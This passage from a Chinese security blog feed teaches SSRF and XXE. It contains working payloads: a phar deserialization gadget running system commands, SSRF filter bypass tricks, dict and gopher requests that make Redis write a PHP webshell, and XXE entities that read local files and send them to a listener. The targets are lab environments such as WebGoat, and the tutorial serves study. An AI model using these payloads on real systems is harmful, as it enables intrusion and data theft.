class="php">&lt;?phpclass AnyClass{    function __destruct()    {        echo $this -&gt; output;    }}@unlink("phar.phar");$phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$object = new AnyClass();$object -&gt; output= 'system("whoami");';$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering();</code></pre><p>利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f5a1bb51129b64015ee455d8b80ddc4a.png"></p><p><em>php://filter</em><br>读取本地文件并进行base64编码</p><pre><code class="php">php://filter/convert.base64-encode/resource=xx.xxphp://filter/read=convert.base64-encode/resource=xx.xx</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/7090bbb36129f35e85d9f1d084319f29.png"></p><p><em>php://input</em><br>可以获取请求中的原始流，如读取POST输入流：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_8/d0002c2998a80484097fb73f1c03a459.png"></p><h2 id="0x05-SSRF常见的绕过方法"><a href="#0x05-SSRF常见的绕过方法" class="headerlink" title="0x05 SSRF常见的绕过方法"></a>0x05 SSRF常见的绕过方法</h2><p>在代码实现过程中，开发者为了防御SSRF漏洞，会对相关的请求进行验证(黑名单、白名单、正则匹配等)，但是其中一些过滤代码存在绕过的可能行，这里总结一些常见的绕过方法(部分方法只能在浏览器中或需要特定语言函数实现，需要结合场景使用，如进行一些社会工程学欺骗等)。</p><h3 id="URL中使用"><a href="#URL中使用" class="headerlink" title="URL中使用@"></a>URL中使用@</h3><p>URL(Uniform Resource Locator,统一资源定位符),用于在互联网中定位数据资源，其完整格式如下</p><pre><code class="html">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</code></pre><p>由格式可知，@符号之后是服务器的地址，可以用于在SSRF一些正则匹配中绕过，从而定位到@之后的服务器地址：</p><pre><code class="html">http://google.com:80+&amp;@220.181.38.251:80/#+@google.com:80/</code></pre><p>CURL带着值为<code>qq.com:</code>的Authorization验证头访问百度：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/df256318675bbf844d7f1c41e67a46e0.png"></p><h3 id="IP的进制转换"><a href="#IP的进制转换" class="headerlink" title="IP的进制转换"></a>IP的进制转换</h3><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a href="https://github.com/vysecurity/IPFuscator">IPFuscator</a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化：<br>在脚本对IP进行八进制转换时，一些情况下会在字符串末尾多加一个L:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ebef0763696a578f8da207a40c0a4b9d.png"><br>这是因为在Python下区分了int和long类型，int数据超出最大值2147483647后会表示为long类型，体现在八进制转换后的字符串末尾跟了个L:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f667f6740c6ba3fa397087900fdb6b92.png"><br>而在python3中都使用int处理，所以可以将脚本升级到Python来用，使用<code>2to3.py</code>工具<code>python3 2to3.py -w xx.py</code>转换代码：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/544129d9ff196b2905f80daa608bd0f0.png"><br>然后可以用python3来执行，但是在使用oct()转八进制的时候，有0o标记，这种的在访问时浏览器识别不了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/dc7a34595ab480c2a18d1c39db24803c.png"><br>使用<code>'0{0:o}'.format(int(5))</code>来代替oct(),修改后的<a href="https://raw.githubusercontent.com/yanghaoi/Script/main/Python/ipfuscator.py">源码</a>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/35395e225c334651964ffe8f0d77fafa.png"><br>也可以使用IPy模块进行转换：</p><pre><code class="python">import IPy#IPv4与十进制互转IPy.IP('127.0.0.1').int() IPy.IP('3689901706').strNormal() #16进制转换IPy.IP('127.0.0.1').strHex()#IPv4/6转换IPy.IP('127.0.0.1').v46map()</code></pre><h3 id="本地回环地址"><a href="#本地回环地址" class="headerlink" title="本地回环地址"></a>本地回环地址</h3><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>):</p><pre><code class="x86asm">http://127.0.0.1http://localhosthttp://127.255.255.254127.0.0.1 - 127.255.255.254http://[::1]http://[::ffff:7f00:1]http://[::ffff:127.0.0.1]http://127.1http://127.0.1http://0:80</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/8da64bbc49bab2a649e4532f19884baa.png"></p><h3 id="punycode转码"><a href="#punycode转码" class="headerlink" title="punycode转码"></a>punycode转码</h3><blockquote><p>IDN（英语：Internationalized Domain Name，缩写：IDN）即为国际化域名，又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。包括法语、阿拉伯语、中文、斯拉夫语、泰米尔语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编译而成。在域名系统中，国际化域名使用Punycode转写并以美国信息交换标准代码（ASCII）字符串储存。punycode是一种表示Unicode码和ASCII码的有限的字符集，可对IDNs进行punycode转码，转码后的punycode就由26个字母+10个数字，还有“-”组成。</p></blockquote><p>使用在线的<a href="http://tools.jb51.net/punycode/index.php">编码工具</a>测试：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/4e31634ab03d3d5e49c5d668b43cc0e1.png"></p><p>对正常的字母数字组成的域名，也可以使用punycode编码格式，即：</p><pre><code class="html">www.qq.com =&gt;  www.xn--qq-.com</code></pre><p>一些浏览器对正常的域名不会使用punycode解码，如Chrome，所以在Chrome中访问失败，测试了部分PHP中的函数，也会失败：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/ba1ece4cd3b5208b68dcaf9e9b440cc2.png"><br>在Firefox90.0.2中可以访问成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/981c1f1a04eff196544caac82fc15406.gif"></p><p><em>同形异义字攻击（IDN_homograph_attack，IDN欺骗）</em><br>同形异义字指的是形状相似但是含义不同，这样的字符如希腊、斯拉夫、亚美尼亚字母，部分字符看起来和英文字母一模一样：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/8f1bba12cb4cf8405bb3bdc2ef5b16fe.png" alt="西里尔字母"><br>如果使用这些字符注册域名，很容易进行欺骗攻击(<a href="https://www.xudongz.com/blog/2017/idn-phishing/">点击查看详情</a>)，所以就出现了punycode转码，用来将含义特殊字符的域名编码为IDN，目前谷歌浏览器、Safari等浏览器会将存在多种语言的域名进行Punycode编码显示。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/3af26b8064396062ff502384084e6736.png"><br>但是在Firefox中的处理方式并没有很严格，如果域名主体部分全部使用某种特殊字符，如单独使用<a href="http://www.52unicode.com/cyrillic-zifu">西里尔字母</a>替换来绕过Firefox浏览器的过滤器。<br>在HOST中配置这样的解析，用来模拟DNS：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/54a4e3268a4143a64f4a9908201fd02f.png"><br>然后浏览器访问，可以看到地址栏显示了差不多的taobao.com。然后通过查看源码可以发现其IDN的显示(进行了Punycode编码)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/132b2739aa2e86160c1be683404e6b42.png"></p><h3 id="封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="封闭式字母数字 (Enclosed Alphanumerics)字符"></a>封闭式字母数字 (Enclosed Alphanumerics)字符</h3><p><a href="https://www.haomeili.net/ZhiShi/34">封闭式字母数字</a>是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。在浏览器测试中只有下列单圆圈的字符可用：</p><pre><code class="html">①    ②    ③    ④    ⑤    ⑥    ⑦    ⑧    ⑨    ⑩    ⑪    ⑫    ⑬    ⑭    ⑮    ⑯⑰    ⑱    ⑲    ⑳    Ⓐ    Ⓑ    Ⓒ    Ⓓ    Ⓔ    Ⓕ    Ⓖ    Ⓗ    Ⓘ    ⒿⓀ    Ⓛ    Ⓜ    Ⓝ    Ⓞ    Ⓟ    Ⓠ    Ⓡ    Ⓢ    Ⓣ    Ⓤ    Ⓥ    Ⓦ    Ⓧ    Ⓨ    Ⓩⓐ    ⓑ    ⓒ    ⓓ    ⓔ    ⓕ    ⓖ    ⓗ    ⓘ    ⓙ    ⓚ    ⓛ    ⓜ    ⓝ    ⓞ    ⓟⓠ    ⓡ    ⓢ    ⓣ    ⓤ    ⓥ    ⓦ    ⓧ    ⓨ    ⓩ    ⓪    </code></pre><pre><code class="groovy">http://①②⑦.0.0.1http://ⒶⓟⓟⓛⒺ.ⓒⓄⓂ</code></pre><p>浏览器访问时会自动识别成拉丁英文字符：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/fbe5532be134ca0f591156e74bf2c3f4.png"></p><h3 id="Redirect-重定向"><a href="#Redirect-重定向" class="headerlink" title="Redirect(重定向)"></a>Redirect(重定向)</h3><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。在github项目<a href="https://github.com/cujanovic/SSRF-Testing/">SSRF-Testing</a>上可以看到已经配置好的用例：</p><pre><code class="html">https://ssrf.localdomain.pw/img-without-body/301-http-www.qq.com-.i.jpghttps://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpghttps://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json</code></pre><p>服务端PHP代码如下：</p><pre><code class="php">&lt;?php header("Location: http://www.baidu.com");exit(); ?&gt;</code></pre><h3 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h3><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p><pre><code class="cmd">nslookup 127.0.0.1.nip.ionslookup owasp.org.127.0.0.1.nip.io</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/30b9d55e263842b3b258c1a96859aa88.png"></p><h3 id="DNS-rebinding-DNS重绑定"><a href="#DNS-rebinding-DNS重绑定" class="headerlink" title="DNS rebinding(DNS重绑定)"></a>DNS rebinding(DNS重绑定)</h3><p>如果某后端代码要发起外部请求，但是不允许对内部IP进行请求，就要对解析的IP进行安全限制，整个流程中首先是要请求一次域名对解析的IP进行检测，检测通过交给后面的函数发起请求。如果在第一次请求时返回公网IP,第二次请求时返回内网IP，就可以达到攻击效果，DNS重绑定一般可用于绕过浏览器同源策略和SSRF的过滤。要使得两次请求返回不同IP需要对DNS缓存进行控制，设置DNS TTL为0，测试cloudflare并不行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/6132b3b14e7783635bd5e7962b7e4525.png"><br>那么还可以自定义DNS服务器，这样就能方便控制每次解析的IP地址了，cloudflare中可以配置NS转发，在可控的VPS上使用SSRF-Testing项目中的dns.py脚本来处理DNS请求，执行<code>python3 dns.py 216.58.214.206 169.254.169.254 127.0.0.1 53 localdomains.pw</code>，在本地53端口开启DNS服务，为localdomains.pw指定两次解析IP，第一次是216.x，第二次是169.x。开启后使用<code>nslookup 1111.localdomains.pw 127.0.0.1</code>指定DNS服务器为127.0.0.1，查询解析记录：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f424305996dcb2c27e54bbedd301e94d.png"><br>这样一来，使用该工具就可以很方便的控制两次解析的IP了。</p><h3 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><pre><code class="avrasm">http://www。qq。comhttp://www｡qq｡comhttp://www．qq．com</code></pre><h3 id="利用短地址绕过"><a href="#利用短地址绕过" class="headerlink" title="利用短地址绕过"></a>利用短地址绕过</h3><p>这个是利用互联网上一些网站提供的<a href="https://www.shorturl.at/">网址缩短</a>服务进行一些黑名单绕过，其原理也是利用重定向：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f15c0cfd2a556f4d27ce6d65e8368574.png"></p><h3 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a>URL十六进制编码</h3><p>URL十六进制编码可被浏览器正常识别，编码脚本：</p><pre><code class="python">#-*- coding:utf-8 -*-data = "www.qq.com";alist = []for x in data:    for i in range(0, len(x), 2):        alist.append((x[i:i+2]).encode('hex'))print "http://%"+'%'.join(alist)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c8c11adfde12b5e17d0d5e23b2ff2d67.png"></p><h2 id="0x06-SSRF的利用实例"><a href="#0x06-SSRF的利用实例" class="headerlink" title="0x06 SSRF的利用实例"></a>0x06 SSRF的利用实例</h2><h3 id="Redis未授权访问Getshell"><a href="#Redis未授权访问Getshell" class="headerlink" title="Redis未授权访问Getshell"></a>Redis未授权访问Getshell</h3><p>PHP SSRF漏洞代码：</p><pre><code class="php">&lt;?php    $ch = curl_init();    // 设置 URL 和相应的选项    curl_setopt($ch, CURLOPT_URL, $_GET["url"]);    curl_setopt($ch, CURLOPT_HEADER, 0);    // 抓取 URL 并把它传递给浏览器    curl_exec($ch);    // 关闭 cURL 资源，并且释放系统资源    curl_close($ch);</code></pre><p>使用DICT协议利用Redis写Webshell：</p><pre><code class="php">#  查询信息dict://192.168.200.97:6379/info                          # dict://192.168.200.97:6379/auth:password (密码破解)# 查询只读配置dict://192.168.200.97:6379/CONFIG:GET:slave-read-only    # 关闭只读配置dict://192.168.200.97:6379/CONFIG:SET:slave-read-only:no   # 查询备份目录dict://192.168.200.97:6379/config:get:dir         # 修改备份目录，目录值使用""，盘符中的:用16进制编码为\x3A，\ =&gt; \\ 。dict://192.168.200.97:6379/config:set:dir:"D\x3A\\phpstudy_pro\\WWW"# 查询备份文件名    dict://192.168.200.97:6379/config:get:dbfilename     # 设置备份文件名dict://192.168.200.97:6379/config:set:dbfilename:w.php              #设置键w的键值为16进制编码的&lt;?php phpinfo(); ?&gt; dict://192.168.200.97:6379/set:w:"\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e"  # 异步保存数据dict://192.168.200.97:6379/BGSAVE--------------------------------- # 查询当前数据库keydict://192.168.200.97:6379/DBSIZE     # 如果脏数据过大导致webshell无法执行,可以清除当前数据库所有key(有风险)dict://192.168.200.97:6379/flushall                         </code></pre><p>使用Gopher协议利用Redis写Webshell:<br>将要执行的命令整体URL编码:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/5310088417592c70510eead611e3fcc2.png"><br>发起请求：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/25700f753cf10284ca1e84ad35f9606d.png"></p><p>如果SSRF的触发点错误的处理HTTP请求，那么也可以结合请求走私利用。比如python2的urllib2模块：</p><pre><code class="python"># -*- coding:utf-8 -*-import urllib2url = "http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?&gt;'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"html = urllib2.urlopen(url).read()print(html)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/506efa2ac99f171ea3c96a5757237ab6.png"><br>利用redis写shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/495fb05f23dac828ba3835bde7bd5553.png"></p><h2 id="0x07-SSRF测试工具"><a href="#0x07-SSRF测试工具" class="headerlink" title="0x07 SSRF测试工具"></a>0x07 SSRF测试工具</h2><p><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap-master</a> - 可以在一个请求包中指定SSRF的位置，工具根据模块来发送EXP，支持了下列漏洞的利用：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/292f7cbbf33e6f327425ae1ef9f5f0b1.png"><br>帮助说明如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a2c9a0836d3f09355295d68673b81e3.png"></p><p><a href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing-master</a> - 常用的SSRF绕过测试<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d1d2e18e21355cd082602c708d984ef6.png"></p><p><a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">redis-over-gopher</a> - 将请求转换为gopher协议格式<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/97ae994b6040c78407f065ecdfaf9f37.png"></p><h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a href="https://www.shorturl.at/">https://www.shorturl.at/</a><br><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a><br><a href="https://github.com/cujanovic/SSRF-Testing/">https://github.com/cujanovic/SSRF-Testing/</a><br><a href="https://www.xudongz.com/blog/2017/idn-phishing/">https://www.xudongz.com/blog/2017/idn-phishing/</a><br><a href="https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher">https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher</a><br><a href="https://zhuanlan.zhihu.com/p/269208311">七大主流的HttpClient程序比较</a><br><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">blind-ssrf-chains</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞基础</title>
      <link href="/2021/10/06/xxe-lou-dong-ji-chu/"/>
      <url>/2021/10/06/xxe-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>做为网络安全从业者，对大部分漏洞名称都熟悉，也大概知道怎么利用，能产生什么危害，比如本文要学习的XXE漏洞。在此之前，只知道这个漏洞是XML解析时存在了问题，引用了外部实体，利用可以用来读取文件、探测内网，某些情况还可以执行命令。但是代码中究竟存在了什么问题，怎么修复；XML实体是什么，都有哪些类型；XXE攻击的类型、利用环境和绕过等这些具体的问题就是只知其一不知其二了。本文基于JAVA的Webgoat漏洞环境来学习XXE漏洞基础知识和各种利用。</p><h2 id="0x02-XML外部实体攻击-XXE"><a href="#0x02-XML外部实体攻击-XXE" class="headerlink" title="0x02 XML外部实体攻击(XXE)"></a>0x02 XML外部实体攻击(XXE)</h2><blockquote><p>XML 外部实体攻击(XXE)是针对解析 XML 输入的应用程序的一种攻击。当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描等系统影响。</p></blockquote><h3 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a>XML的格式</h3><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE note [  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;]&gt;&lt;note&gt;  &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don't forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2021/08/05/63rbgyjlxPaFUOD.png"></p><h3 id="文档类型定义（DTD）"><a href="#文档类型定义（DTD）" class="headerlink" title="文档类型定义（DTD）"></a>文档类型定义（DTD）</h3><p>了解XML实体之前先熟悉下DTD，DTD 文件是一种特殊类型的 XML 文件，其中包含有关 XML 格式或结构的信息。它们用于在不同的、单独的 XML 文件之间建立一致性。这些 DTD 文件可以包含一个称为 ENTITY 的元素，DTD可以在XML内部也可以单独存在DTD文件中。XML实体在 DTD 中创建，实体可以利用协议进行系统调用。 内部的DOCTYPE声明：</p><pre><code class="xml">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)&gt;  &lt;!ELEMENT to (#PCDATA)&gt;  &lt;!ENTITY to "123"&gt;]&gt;!DOCTYPE note     定义文档的类型是note;!ELEMENT note     定义note里的元素；!ELEMENT to         定义元素to的数据类型是#PCDATA，也可以用ANY;!ENTITY to             定义元素to的值</code></pre><p>外部的DOCTYPE声明：</p><pre><code class="xml">&lt;!DOCTYPE note SYSTEM "http://x.x.x.x/note.dtd"&gt;</code></pre><p>独立的DTD文件,为XML中的DTD部分，直接保存为单独的.dtd文件：</p><pre><code class="xml">&lt;!ELEMENT note (to)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ENTITY to "123"&gt;</code></pre><h3 id="XML实体类型"><a href="#XML实体类型" class="headerlink" title="XML实体类型"></a>XML实体类型</h3><p>实体是对数据引用，须在DTD中定义。XML中引用实体的方式是<code>&amp;实体名称;</code>，一般来说需要了解的有下面几种类型：</p><h4 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h4><p>指用十进制格式<code>&amp;#37;</code>或十六进制格式<code>&amp;#x25;</code>来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。<code>&amp;#37; = &amp;#x25; = %</code>，在a中的值使用字符实体转码%定义参数实体b：</p><pre><code class="xml">&lt;!DOCTYPE xxe [&lt;!ENTITY % a "&lt;!ENTITY &amp;#x25; b SYSTEM 'http://127.0.0.1:8090/ewq'&gt;"&gt;%a;%b;]&gt;&lt;root/&gt;</code></pre><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>指ENTITY没有关键字<code>SYSTEM</code>，<code>PUBLIC</code>的实体，如下XML:</p><pre><code class="xml">&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)&gt;&lt;!ENTITY to "123"&gt;]&gt;&lt;root&gt;&amp;to;&lt;/root&gt;</code></pre><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>ENTITY中关键字为SYSTEM, PUBLIC “id”格式，具体值是链接指向的文件内容，相当于一个包含效果，将远程的内容用一个内部实体存放到内部dtd中 ：</p><pre><code class="xml">&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM "file:///1.txt"&gt;]&gt;&lt;comment&gt;&lt;text&gt;&amp;e;&lt;/text&gt;&lt;/comment&gt;&amp;&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE a [&lt;!ENTITY e PUBLIC "2" "file:///1.txt"&gt;]&gt;&lt;comment&gt;&lt;text&gt;&amp;e;&lt;/text&gt;&lt;/comment&gt;</code></pre><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体在dtd文件中或xml的dtd区中定义，定义格式为 <code>&lt;!ENTITY % 实体名称 "实体的值"&gt;</code>，引用格式使用%：<code>%实体名称</code>：</p><pre><code class="xml">&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY % a SYSTEM "file:///1.txt"&gt;%a;]&gt;&lt;root/&gt;</code></pre><pre><code class="xml">&lt;!DOCTYPE test [&lt;!ENTITY % aaa SYSTEM "http://127.0.0.1:8080/ext.dtd"&gt;%aaa;]&gt;</code></pre><p>参数实体的引用需要注意下面几点：<br>1.在参数实体中可以引用其他参数实体，但这种引用只能出现在外部DTD子集声明中；<br>2.参数实体可以定义新的实体；<br>3.参数实体解析优先级高于其他实体。<br>为了理解参数实体的利用方式，在Webgoat中XXE例子中进行详细测试，如下位置，想通过param3引用data的值:</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE r [&lt;!ENTITY % data SYSTEM "file:///c://2.txt"&gt;&lt;!ENTITY % param3 "http://127.0.0.1:8090/txt=%data;"&gt;%param3;]&gt;</code></pre><p>发送后出现了错误“参数实体引用 “%data;” 不能出现在 DTD 的内部子集中的标记内”：<br><img src="https://i.loli.net/2021/08/06/TCPgAf75lFbKJ24.png"><br>所以在外部DTD中用参数实体引用其他参数实体：<br><img src="https://i.loli.net/2021/08/06/vc1SYszAPWJHRq7.png"><br>这里发现%data并没有被替换成文件内容发送到http服务器上，这里注意到使用的是SYSTEM关键字，后面的会直接被当成外部的链接了。所以这里既要把读取文件内容的参数实体解析进去又要对外发起请求，就需要有两次实体的引用，一次是将文件内容解析到字符串中，一次是引用外部实体时将数据带出，参数实体很好的具备了这些特性，可以从字符串中定义新的实体，并在dtd中进行引用完成多次的内容替换，所以构造外部dtd文件为：</p><pre><code class="xml">&lt;!ENTITY % p "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://127.0.0.1:8090/?id=%data;'&gt;"&gt; %p;%exfil;</code></pre><p>在 <code>%p;</code> 解析中 <code>&amp;#x25;</code> 解析为%，<code>%data</code>解析为文件内容 ，内部表现为如下xml，这样再次解析exfil等于一个外部实体引用就可以发起外部DTD的请求了：</p><pre><code class="xml">&lt;!ENTITY % exfil SYSTEM 'http://127.0.0.1:8090/?id=文件内容'&gt; %exfil;</code></pre><p>如果这里使用普通实体来定义新的实体，会直接因为字符 <code>&lt;</code>  抛出异常<code>元素内容必须由格式正确的字符数据或标记组成。</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ee697d143246710d19437603ec30dcaa.png"><br>所以需要用参数实体来定义新的外部实体。POC发起后，成功在web监听上获取到了文件内容：<br><img src="https://i.loli.net/2021/08/06/ohklO9aS31JQvXG.png"><br>这里注意到响应中抛出了Unicode编码的异常:</p><pre><code class="tex">\u6587\u6863\u7C7B\u578B\u58F0\u660E\u5305\u542B\u6216\u6307\u5411\u7684\u6807\u8BB0\u58F0\u660E\u5FC5\u987B\u683C\u5F0F\u6B63\u786E\u3002 转换过来就是：文档类型声明包含或指向的标记声明必须格式正确。</code></pre><p>是因为引用外部的实体不是正确的dtd格式，将服务器返回一个正常的dtd格式，那么就正常了,POC:：</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % data SYSTEM "file:///c://2.txt"&gt;&lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;%param3;]&gt;&lt;comment&gt; &lt;text&gt;777&amp;text;&lt;/text&gt;&lt;/comment&gt;</code></pre><p>note.dtd:</p><pre><code class="xml">&lt;!ENTITY % p "&lt;!ENTITY % send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'&gt;"&gt; %p;%send;</code></pre><p>2.dtd：</p><pre><code class="xml">&lt;!ENTITY text "Hi!!"&gt;</code></pre><p><img src="https://i.loli.net/2021/08/06/BcnVLmdYQWx1pKz.png"><br>理解了参数实体部分，后续构造XXE Payload就比较容易了。</p><h3 id="XXE类型"><a href="#XXE类型" class="headerlink" title="XXE类型"></a>XXE类型</h3><p>一般来说，可以分为以下类型的 XXE 攻击：<br>XXE回显注入(Classic XXE)        — 一般的XXE,响应直接或间接返回资源内容<br>XXE盲注(Bind XXE) — 响应中不显示输出或错误<br>XXE报错注入(Error XXE) — 资源的内容在错误信息中返回<br>XXE DOS — 利用多重实体嵌套解析消耗服务器内存</p><p>在Webgoat中对几种注入进行测试。</p><h4 id="XXE回显注入"><a href="#XXE回显注入" class="headerlink" title="XXE回显注入"></a>XXE回显注入</h4><p>先传入正常值可在评论列表获得回显信息:<br><img src="https://i.loli.net/2021/08/05/crvYTpLPI1uKA7h.png"><br>测试实体引用，使用DTD定义实体，发送数据后，观察到内容在评论出回显，说明可以引用实体：</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b "666666666666666666666666666666666666666666666666666666666666666666"&gt;]&gt; &lt;comment&gt;&lt;text&gt;&amp;b;&lt;/text&gt;&lt;/comment&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8cd3b4817c903cd19ad1c796df11db22.png"><br>再测试外部实体的引用，尝试使用HTTP协议引用外部DTD文件:</p><pre><code class="xml">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:8090/note.dtd"&gt;&lt;comment&gt;&lt;text&gt;&amp;b;&lt;/text&gt;&lt;/comment&gt;</code></pre><p>外部dtd为note.dtd,内容如下，定义了一个普通实体b，值为 this is dtd:</p><pre><code class="xml">&lt;!ENTITY b "this is 